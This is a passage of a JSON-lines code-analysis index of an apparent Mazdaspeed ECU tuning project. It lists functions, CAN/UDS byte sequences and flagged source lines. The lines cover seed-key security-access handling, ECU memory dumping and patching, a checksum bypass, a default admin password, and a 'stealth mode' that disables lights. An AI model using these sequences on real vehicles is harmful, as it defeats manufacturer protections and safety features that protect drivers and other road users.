"hardware", "line": 345, "hardware": "vehicle", "content": "self.logger.info(\"Vehicle connection established\")"}, {"type": "hardware", "line": 348, "hardware": "vehicle", "content": "self.read_vehicle_info()"}, {"type": "hardware", "line": 351, "hardware": "vehicle", "content": "messagebox.showerror(\"Connection Error\", \"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 355, "hardware": "vehicle", "content": "def read_vehicle_info(self):"}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "\"\"\"READ VEHICLE INFORMATION FROM ECU\"\"\""}, {"type": "hardware", "line": 356, "hardware": "vehicle", "content": "\"\"\"READ VEHICLE INFORMATION FROM ECU\"\"\""}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "vin_data = self.ecu_exploiter.dump_ecu_memory(0xFF0000, 17)"}, {"type": "hardware", "line": 361, "hardware": "vehicle", "content": "self.vehicle_data['vin'] = vin_data.decode('ascii', errors='ignore')"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "cal_id_data = self.ecu_exploiter.dump_ecu_memory(0xFF8000, 10)"}, {"type": "hardware", "line": 366, "hardware": "vehicle", "content": "self.vehicle_data['calibration_id'] = cal_id_data.hex()"}, {"type": "hardware", "line": 368, "hardware": "vehicle", "content": "self.logger.info(f\"Vehicle VIN: {self.vehicle_data.get('vin', 'Unknown')}\")"}, {"type": "hardware", "line": 371, "hardware": "vehicle", "content": "self.logger.error(f\"Error reading vehicle info: {e}\")"}, {"type": "hardware", "line": 397, "hardware": "ECU", "content": "def flash_ecu(self):"}, {"type": "hardware", "line": 398, "hardware": "ECU", "content": "\"\"\"FLASH GENERATED TUNE TO ECU\"\"\""}, {"type": "hardware", "line": 404, "hardware": "ECU", "content": "self.status_var.set(\"Flashing ECU...\")"}, {"type": "hardware", "line": 414, "hardware": "ECU", "content": "self.logger.info(\"ECU flash completed successfully\")"}, {"type": "hardware", "line": 415, "hardware": "ECU", "content": "messagebox.showinfo(\"Success\", \"ECU flashed successfully\")"}, {"type": "hardware", "line": 419, "hardware": "ECU", "content": "self.logger.error(f\"ECU flash failed: {e}\")"}, {"type": "hardware", "line": 448, "hardware": "ECU", "content": "self.ecu_exploiter.real_time_parameter_change('boost_target', 10.0)"}, {"type": "hardware", "line": 449, "hardware": "ECU", "content": "self.ecu_exploiter.real_time_parameter_change('ignition_timing', 8.0)"}, {"type": "hardware", "line": 498, "hardware": "vehicle", "content": "\"\"\"READ SENSOR DATA FROM VEHICLE\"\"\""}, {"type": "hardware", "line": 563, "hardware": "ECU", "content": "\"\"\"RESET ECU ADAPTIVE LEARNING\"\"\""}, {"type": "hardware", "line": 567, "hardware": "ECU", "content": "self.logger.info(\"ECU adaptations reset\")"}], "security_logic": [{"type": "security_pattern", "line": 25, "pattern": "key", "content": "from mazda_seed_key import MazdaSeedKeyAlgorithm"}, {"type": "security_pattern", "line": 25, "pattern": "seed", "content": "from mazda_seed_key import MazdaSeedKeyAlgorithm"}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "from mazda_seed_key import MazdaSeedKeyAlgorithm"}, {"type": "security_pattern", "line": 131, "pattern": "key", "content": "for i, (label, key, min_val, max_val) in enumerate(parameters):"}, {"type": "security_pattern", "line": 148, "pattern": "key", "content": "self.gauges[key] = {"}, {"type": "security_pattern", "line": 478, "pattern": "key", "content": "for key in self.plot_data:"}, {"type": "security_pattern", "line": 479, "pattern": "key", "content": "self.plot_data[key] = self.plot_data[key][-100:]"}, {"type": "security_pattern", "line": 514, "pattern": "key", "content": "for key, gauge in self.gauges.items():"}, {"type": "security_pattern", "line": 515, "pattern": "key", "content": "if key in sensor_data:"}, {"type": "security_pattern", "line": 516, "pattern": "key", "content": "value = sensor_data[key]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts8.py", "lines_read": 1123, "features_found": [{"type": "function", "name": "__init__", "line": 47}, {"type": "function", "name": "__init__", "line": 263}, {"type": "function", "name": "stop_telemetry", "line": 330}, {"type": "function", "name": "_telemetry_loop", "line": 338}, {"type": "function", "name": "_process_can_message", "line": 371}, {"type": "function", "name": "get_current_data", "line": 403}, {"type": "function", "name": "get_data_history", "line": 407}, {"type": "function", "name": "calculate_performance_metrics", "line": 418}, {"type": "function", "name": "__init__", "line": 461}, {"type": "function", "name": "__init__", "line": 671}, {"type": "function", "name": "_build_optimization_model", "line": 676}, {"type": "function", "name": "analyze_performance_trends", "line": 688}, {"type": "function", "name": "generate_optimization_suggestions", "line": 745}, {"type": "function", "name": "log_performance_data", "line": 783}, {"type": "function", "name": "train_optimization_model", "line": 794}, {"type": "function", "name": "__init__", "line": 811}, {"type": "function", "name": "setup_enhanced_routes", "line": 820}, {"type": "function", "name": "test_launch_control_activation", "line": 933}, {"type": "function", "name": "test_telemetry_data_processing", "line": 947}, {"type": "function", "name": "test_performance_analytics", "line": 962}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "logging.handlers", "line": null}, {"type": "import", "module": "contextlib", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "concurrent.futures", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "signal", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "RotatingFileHandler", "line": null}, {"type": "import", "module": "sqlite3", "line": null}, {"type": "import", "module": "contextmanager", "line": null}, {"type": "import", "module": "aiohttp", "line": null}, {"type": "import", "module": "web", "line": null}, {"type": "import", "module": "jwt", "line": null}, {"type": "import", "module": "bcrypt", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "docker", "line": null}, {"type": "import", "module": "pytest", "line": null}, {"type": "import", "module": "multiprocessing", "line": null}, {"type": "import", "module": "ThreadPoolExecutor", "line": null}], "components_found": [{"type": "class", "name": "RacingFeatureController", "line": 44}, {"type": "class", "name": "RealTimeTelemetry", "line": 260}, {"type": "class", "name": "DiagnosticExploiter", "line": 458}, {"type": "class", "name": "PerformanceAnalytics", "line": 668}, {"type": "class", "name": "EnhancedMazdaTunerAPI", "line": 808}, {"type": "class", "name": "TestRacingFeatures", "line": 930}, {"type": "class", "name": "MockCANEngine", "line": 936}], "algorithms": [{"type": "algorithm_function", "line": 418, "content": "def calculate_performance_metrics(self) -> Dict[str, float]:"}, {"type": "algorithm_function", "line": 643, "content": "async def _calculate_current_checksum(self) -> Optional[int]:"}], "protocols": [{"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x01, 0xF0, 0x00),  # Enable launch control feature"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x02, (rpm_limit >> 8) & 0xFF, rpm_limit & 0xFF),  # Set RPM limit"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x03, 0x01, 0x00),  # Activate system"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x71:"}, {"type": "protocol", "line": 90, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x10, 0x01, 0x00),  # Enable flat shift"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x11, fuel_cut_duration, 0x00),  # Fuel cut duration (ms)"}, {"type": "protocol", "line": 92, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x12, ignition_retard, 0x00),  # Ignition retard (degrees)"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x71:"}, {"type": "protocol", "line": 131, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x30, 0x01, 0x00),  # Enable anti-lag system"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x31, 0x0A, 0x00),  # Retard timing significantly"}, {"type": "protocol", "line": 133, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x32, aggressiveness, 0x00),  # Aggressiveness level"}, {"type": "protocol", "line": 134, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x33, 0x01, 0x00),  # Enable spark cut"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 140, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x71:"}, {"type": "protocol", "line": 160, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x20, aggressiveness, 0x00),  # Aggressiveness level"}, {"type": "protocol", "line": 161, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x21, 0x01, 0x00),  # Enable fuel overrun"}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x22, duration, 0x00),  # Duration of pops"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x71:"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x40, (launch_rpm >> 8) & 0xFF, launch_rpm & 0xFF),"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x41, (burnout_rpm >> 8) & 0xFF, burnout_rpm & 0xFF),"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x42, 0x01, 0x00),  # Enable 2-step"}, {"type": "protocol", "line": 190, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x71:"}, {"type": "protocol", "line": 208, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x50, 0x01, 0x00),  # Enable stealth mode"}, {"type": "protocol", "line": 209, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x51, 0x00, 0x00),  # Disable DRLs"}, {"type": "protocol", "line": 210, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x52, 0x00, 0x00),  # Disable interior lights"}, {"type": "protocol", "line": 214, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 216, "protocol": "0x[0-9A-Fa-f]+", "content": "if not response or response[0] != 0x71:"}, {"type": "protocol", "line": 232, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x01, 0x00, 0x00),  # Disable launch control"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x10, 0x00, 0x00),  # Disable flat shift"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x30, 0x00, 0x00),  # Disable anti-lag"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x20, 0x00, 0x00),  # Disable pop & bang"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x40, 0x00, 0x00),  # Disable 2-step"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x31, 0x50, 0x00, 0x00),  # Disable stealth mode"}, {"type": "protocol", "line": 241, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, data1, data2, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "'can_id': 0x201,"}, {"type": "protocol", "line": 282, "protocol": "0x[0-9A-Fa-f]+", "content": "'can_id': 0x420,"}, {"type": "protocol", "line": 289, "protocol": "0x[0-9A-Fa-f]+", "content": "'can_id': 0x201,"}, {"type": "protocol", "line": 296, "protocol": "0x[0-9A-Fa-f]+", "content": "'can_id': 0x420,"}, {"type": "protocol", "line": 303, "protocol": "0x[0-9A-Fa-f]+", "content": "'can_id': 0x212,"}, {"type": "protocol", "line": 310, "protocol": "0x[0-9A-Fa-f]+", "content": "'can_id': 0x215,"}, {"type": "protocol", "line": 372, "protocol": "CAN", "content": "\"\"\"PROCESS INDIVIDUAL CAN MESSAGE AND EXTRACT SENSOR DATA\"\"\""}, {"type": "protocol", "line": 483, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x3E, 0x00),  # Tester present"}, {"type": "protocol", "line": 484, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x10, 0x03),  # Start extended session"}, {"type": "protocol", "line": 485, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x27, 0x01),  # Security access request"}, {"type": "protocol", "line": 489, "protocol": "0x[0-9A-Fa-f]+", "content": "payload = bytes([sub, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 514, "protocol": "0x[0-9A-Fa-f]+", "content": "if message and message.arbitration_id in [0x7E0, 0x7E1, 0x7E2]:"}, {"type": "protocol", "line": 527, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('engine', 0x22, b'\\xF1\\x86')"}, {"type": "protocol", "line": 528, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response[0] == 0x62"}, {"type": "protocol", "line": 541, "protocol": "0x[0-9A-Fa-f]+", "content": "chunk_size = 0xFF  # Maximum bytes per request"}, {"type": "protocol", "line": 552, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('engine', 0x23, payload)"}, {"type": "protocol", "line": 553, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x63:"}, {"type": "protocol", "line": 555, "protocol": "0x[0-9A-Fa-f]+", "content": "data_start = 4  # Skip 0x63 and 3-byte address"}, {"type": "protocol", "line": 573, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_response = await self.can.send_diagnostic_request('engine', 0x27, b'\\x01')"}, {"type": "protocol", "line": 574, "protocol": "0x[0-9A-Fa-f]+", "content": "if not seed_response or seed_response[0] != 0x67:"}, {"type": "protocol", "line": 581, "protocol": "0x[0-9A-Fa-f]+", "content": "key_response = await self.can.send_diagnostic_request('engine', 0x27, b'\\x02' + calculated_key)"}, {"type": "protocol", "line": 582, "protocol": "0x[0-9A-Fa-f]+", "content": "return key_response is not None and key_response[0] == 0x67"}, {"type": "protocol", "line": 597, "protocol": "CAN", "content": "logging.error(\"Memory patch too large for single CAN message\")"}, {"type": "protocol", "line": 600, "protocol": "0x[0-9A-Fa-f]+", "content": "response = await self.can.send_diagnostic_request('engine', 0x3D, payload)"}, {"type": "protocol", "line": 602, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x7D:"}, {"type": "protocol", "line": 620, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_routine_address = 0xFFFF00  # Typical location"}, {"type": "protocol", "line": 630, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address = 0xFFF000  # Typical checksum storage"}, {"type": "protocol", "line": 647, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_data = await self.dump_ecu_memory(0xFF0000, 0x1000)"}, {"type": "protocol", "line": 656, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + word) & 0xFFFF"}, {"type": "protocol", "line": 813, "protocol": "CAN", "content": "self.can_engine = MazdaCANEngine()"}, {"type": "protocol", "line": 936, "protocol": "CAN", "content": "class MockCANEngine:"}, {"type": "protocol", "line": 940, "protocol": "CAN", "content": "can_engine = MockCANEngine()"}, {"type": "protocol", "line": 949, "protocol": "CAN", "content": "telemetry = RealTimeTelemetry(None)  # No CAN engine for unit test"}, {"type": "protocol", "line": 1004, "protocol": "CAN", "content": "- CAN_INTERFACE=can0"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "ADVANCED RACING FEATURES & REAL-TIME ECU EXPLOITATION"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "from concurrent.futures import ThreadPoolExecutor"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "def __init__(self, can_engine, security_core):"}, {"type": "hardware", "line": 463, "hardware": "ECU", "content": "self.security = security_core"}, {"type": "hardware", "line": 467, "hardware": "ECU", "content": "'memory_dumping': self._dump_ecu_memory,"}, {"type": "hardware", "line": 485, "hardware": "ECU", "content": "(0x27, 0x01),  # Security access request"}, {"type": "hardware", "line": 532, "hardware": "ECU", "content": "async def dump_ecu_memory(self, start_address: int, length: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 533, "hardware": "ECU", "content": "\"\"\"DUMP ECU MEMORY USING EXTENDED DIAGNOSTIC SERVICES\"\"\""}, {"type": "hardware", "line": 536, "hardware": "ECU", "content": "if not await self._ensure_security_access():"}, {"type": "hardware", "line": 537, "hardware": "ECU", "content": "logging.error(\"Security access required for memory dumping\")"}, {"type": "hardware", "line": 570, "hardware": "ECU", "content": "async def _ensure_security_access(self) -> bool:"}, {"type": "hardware", "line": 571, "hardware": "ECU", "content": "\"\"\"ENSURE SECURITY ACCESS IS GRANTED\"\"\""}, {"type": "hardware", "line": 578, "hardware": "ECU", "content": "calculated_key = self.security._mazda_m12r_algorithm(seed)"}, {"type": "hardware", "line": 585, "hardware": "ECU", "content": "\"\"\"PATCH ECU MEMORY AT RUNTIME - NO REFLASH REQUIRED\"\"\""}, {"type": "hardware", "line": 587, "hardware": "ECU", "content": "if not await self._ensure_security_access():"}, {"type": "hardware", "line": 616, "hardware": "ECU", "content": "\"\"\"BYPASS ECU CHECKSUM VERIFICATION FOR TUNING\"\"\""}, {"type": "hardware", "line": 647, "hardware": "ECU", "content": "cal_data = await self.dump_ecu_memory(0xFF0000, 0x1000)"}, {"type": "hardware", "line": 695, "hardware": "ABS", "content": "knock = abs(telemetry_data.get('knock_retard', 0))"}, {"type": "hardware", "line": 755, "hardware": "ABS", "content": "abs(current_performance.get('knock_retard', 0)) / 8.0,"}, {"type": "hardware", "line": 816, "hardware": "ECU", "content": "self.diagnostic_exploiter = DiagnosticExploiter(self.can_engine, MazdaSecurityCore())"}, {"type": "hardware", "line": 1038, "hardware": "ECU", "content": "- GF_SECURITY_ADMIN_PASSWORD=admin"}, {"type": "hardware", "line": 1108, "hardware": "ECU", "content": "logging.info(\"Features available: Racing modes, Real-time telemetry, AI optimization, Security explo"}], "security_logic": [{"type": "security_pattern", "line": 12, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 20, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 536, "pattern": "security_access", "content": "if not await self._ensure_security_access():"}, {"type": "security_pattern", "line": 570, "pattern": "security_access", "content": "async def _ensure_security_access(self) -> bool:"}, {"type": "security_pattern", "line": 573, "pattern": "seed", "content": "seed_response = await self.can.send_diagnostic_request('engine', 0x27, b'\\x01')"}, {"type": "security_pattern", "line": 574, "pattern": "seed", "content": "if not seed_response or seed_response[0] != 0x67:"}, {"type": "security_pattern", "line": 577, "pattern": "seed", "content": "seed = seed_response[2:6]"}, {"type": "security_pattern", "line": 578, "pattern": "key", "content": "calculated_key = self.security._mazda_m12r_algorithm(seed)"}, {"type": "security_pattern", "line": 578, "pattern": "seed", "content": "calculated_key = self.security._mazda_m12r_algorithm(seed)"}, {"type": "security_pattern", "line": 578, "pattern": "algorithm", "content": "calculated_key = self.security._mazda_m12r_algorithm(seed)"}, {"type": "security_pattern", "line": 581, "pattern": "key", "content": "key_response = await self.can.send_diagnostic_request('engine', 0x27, b'\\x02' + calculated_key)"}, {"type": "security_pattern", "line": 582, "pattern": "key", "content": "return key_response is not None and key_response[0] == 0x67"}, {"type": "security_pattern", "line": 587, "pattern": "security_access", "content": "if not await self._ensure_security_access():"}, {"type": "security_pattern", "line": 1038, "pattern": "password", "content": "- GF_SECURITY_ADMIN_PASSWORD=admin"}, {"type": "security_pattern", "line": 1114, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts9.py", "lines_read": 109, "features_found": [{"type": "function", "name": "to_dict", "line": 20}, {"type": "function", "name": "to_dict", "line": 53}, {"type": "function", "name": "to_dict", "line": 68}, {"type": "function", "name": "get_boost_maps", "line": 95}, {"type": "function", "name": "set_boost_maps", "line": 98}, {"type": "function", "name": "to_dict", "line": 101}, {"type": "import", "module": "app", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "db", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "Vehicle", "line": 5}, {"type": "class", "name": "ECUData", "line": 28}, {"type": "class", "name": "DiagnosticTroubleCode", "line": 56}, {"type": "class", "name": "TuningProfile", "line": 77}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "vehicle", "content": "class Vehicle(db.Model):"}, {"type": "hardware", "line": 6, "hardware": "vehicle", "content": "\"\"\"Vehicle model for Mazdaspeed 3 2011 specific data\"\"\""}, {"type": "hardware", "line": 7, "hardware": "vehicle", "content": "__tablename__ = 'vehicles'"}, {"type": "hardware", "line": 12, "hardware": "ECU", "content": "ecu_type = db.Column(db.String(50), default='MZR 2.3L DISI TURBO')"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "ecu_data = db.relationship('ECUData', backref='vehicle', lazy=True)"}, {"type": "hardware", "line": 16, "hardware": "vehicle", "content": "ecu_data = db.relationship('ECUData', backref='vehicle', lazy=True)"}, {"type": "hardware", "line": 17, "hardware": "vehicle", "content": "dtcs = db.relationship('DiagnosticTroubleCode', backref='vehicle', lazy=True)"}, {"type": "hardware", "line": 18, "hardware": "vehicle", "content": "tuning_profiles = db.relationship('TuningProfile', backref='vehicle', lazy=True)"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "'ecu_type': self.ecu_type,"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "class ECUData(db.Model):"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "\"\"\"Real-time ECU data storage\"\"\""}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "__tablename__ = 'ecu_data'"}, {"type": "hardware", "line": 33, "hardware": "vehicle", "content": "vehicle_id = db.Column(db.String(17), db.ForeignKey('vehicles.id'), nullable=False)"}, {"type": "hardware", "line": 61, "hardware": "vehicle", "content": "vehicle_id = db.Column(db.String(17), db.ForeignKey('vehicles.id'), nullable=False)"}, {"type": "hardware", "line": 82, "hardware": "vehicle", "content": "vehicle_id = db.Column(db.String(17), db.ForeignKey('vehicles.id'), nullable=False)"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "key", "content": "id = db.Column(db.String(17), primary_key=True)  # VIN"}, {"type": "security_pattern", "line": 10, "pattern": "key", "content": "user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)"}, {"type": "security_pattern", "line": 32, "pattern": "key", "content": "id = db.Column(db.Integer, primary_key=True)"}, {"type": "security_pattern", "line": 33, "pattern": "key", "content": "vehicle_id = db.Column(db.String(17), db.ForeignKey('vehicles.id'), nullable=False)"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "id = db.Column(db.Integer, primary_key=True)"}, {"type": "security_pattern", "line": 61, "pattern": "key", "content": "vehicle_id = db.Column(db.String(17), db.ForeignKey('vehicles.id'), nullable=False)"}, {"type": "security_pattern", "line": 81, "pattern": "key", "content": "id = db.Column(db.Integer, primary_key=True)"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "vehicle_id = db.Column(db.String(17), db.ForeignKey('vehicles.id'), nullable=False)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_architecture_diagram/ARCHITECTURE.md", "lines_read": 10, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_architecture_diagram/ARCHITECTURE_DIAGRAM.txt", "lines_read": 29, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_build_instructions/BUILD_INSTRUCTIONS.md", "lines_read": 95, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_technical_spec (2)/MUTS_Technical_Spec.pdf", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["muts"]}
{"file_path": "muts_technical_spec (2)/README.md", "lines_read": 9, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_technical_spec/MUTS_Technical_Spec.pdf", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["muts"]}
{"file_path": "muts_technical_spec/README.md", "lines_read": 9, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/backend/flash_service.py", "lines_read": 427, "features_found": [{"type": "function", "name": "get_flash_status_for_websocket", "line": 406}, {"type": "function", "name": "flash_progress_websocket_callback", "line": 416}, {"type": "function", "name": "__init__", "line": 56}, {"type": "function", "name": "add_progress_callback", "line": 73}, {"type": "function", "name": "remove_progress_callback", "line": 77}, {"type": "function", "name": "_notify_progress", "line": 82}, {"type": "function", "name": "pause_operation", "line": 246}, {"type": "function", "name": "resume_operation", "line": 257}, {"type": "function", "name": "cancel_operation", "line": 268}, {"type": "function", "name": "get_operation_status", "line": 280}, {"type": "function", "name": "get_all_operations", "line": 292}, {"type": "function", "name": "_operation_to_dict", "line": 303}, {"type": "function", "name": "_save_operation", "line": 313}, {"type": "function", "name": "_load_state", "line": 326}, {"type": "function", "name": "_start_monitoring", "line": 363}, {"type": "function", "name": "_monitor_loop", "line": 368}, {"type": "function", "name": "cleanup", "line": 396}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "main", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "manager", "line": null}], "components_found": [{"type": "class", "name": "FlashState", "line": 21}, {"type": "class", "name": "FlashOperation", "line": 35}, {"type": "class", "name": "FlashService", "line": 50}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "Handles ECU flashing with connection resilience and rollback capabilities"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "Independent flash service that handles ECU flashing operations"}, {"type": "hardware", "line": 124, "hardware": "ECU", "content": "asyncio.create_task(self._execute_flash(self.current_operation))"}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "async def _execute_flash(self, operation: FlashOperation):"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "\"\"\"Execute flash operation with error handling and rollback\"\"\""}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "\"\"\"Backup current ROM from ECU\"\"\""}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "asyncio.create_task(self._execute_flash(operation))"}], "security_logic": 